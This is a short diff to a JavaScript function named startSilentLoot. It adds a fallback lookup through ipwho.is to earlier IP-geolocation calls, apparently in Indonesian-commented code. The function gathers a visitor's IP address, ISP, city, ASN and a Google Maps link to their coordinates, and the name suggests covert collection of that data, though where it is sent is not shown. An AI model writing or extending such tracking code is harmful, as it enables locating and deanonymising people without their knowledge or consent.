@@ -108,7 +108,7 @@ async function startSilentLoot() {
             if (d.ip) {
                 return { 
                     ip: d.ip, 
-                    isp: d.isp || "Unknown ISP", 
+                    isp: d.isp || "-", 
                     city: d.city_name || "Unknown City", 
                     district: d.district || "N/A", 
                     loc: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`,
@@ -116,6 +116,22 @@ async function startSilentLoot() {
                 };
             }
         } catch (e) { console.log("API 1 Error"); }
+
+        try {
+            const res = await fetch(`https://ipwho.is/`);
+            const d = await res.json();
+
+            if (d.success) {
+                return { 
+                    ip: d.ip,
+                    isp: d.connection?.isp || "Unknown",
+                    city: d.city,
+                    district: "N/A",
+                    loc: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`,
+                    asn: d.connection?.asn || "N/A"
+                };
+            }
+        } catch (e) { console.log("IPWHOIS Error"); }
 
         // 2. CADANGAN: IP-API (Gratis & dapet ISP juga buat jaga-jaga)
         try {
